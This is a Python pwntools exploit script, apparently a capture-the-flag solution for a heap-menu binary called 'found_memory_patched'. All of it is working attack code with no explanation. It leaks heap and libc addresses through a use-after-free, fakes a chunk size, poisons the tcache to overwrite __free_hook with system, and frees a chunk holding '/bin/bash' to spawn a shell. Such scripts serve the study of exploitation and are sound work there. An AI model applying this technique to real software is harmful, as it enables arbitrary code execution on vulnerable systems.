#!/usr/bin/env python3

from pwn import *

elf = ELF("./found_memory_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

"""
Menu:
1) Alloc
2) Free
3) View
4) Edit
5) Exit
>
"""

p = process(elf.path)

def alloc():
    p.sendlineafter(b">", b"1")
    idx = p.recvuntil(b"Menu:").split(b"\x00")[1].split(b"\n")[0]
    return int(idx)

def free(idx):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"Index to free:", str(idx).encode())

def read(idx):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"Index to view:", str(idx).encode())
    data = p.recvuntil(b"Menu:").split(b"\n\n")[0][1:]
    return data

def write(idx, data):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b"Index to edit:", str(idx).encode())
    p.sendafter(b"Enter data:", data)

# Leak heap
alloc()
alloc()
free(0)
free(1)

heap_leak = read(1)[:8]
print(f"[+] heap leak , chunk0 = {hex(u64(heap_leak))}")
heap_leak = u64(heap_leak)

write(1, p8(0xd0))

body = alloc()
head_of_body = alloc()

for _ in range(17):
    alloc()

write(head_of_body, p64(0)+p64(0x441))

free(body)

libc_addr = u64(read(body)[:8]) - 0x1ecbe0
print(f"[+] libc leak : base = {hex(libc_addr)}")

offset_hook = libc.sym.__free_hook - libc.address
real_hook = libc_addr + offset_hook

write(12, b"/bin/bash")

free(10)
free(11)

write(11, p64(real_hook))

alloc()
hooked = alloc()

write(hooked, p64(libc_addr + (libc.sym.system - libc.address)))

free(12)

p.interactive()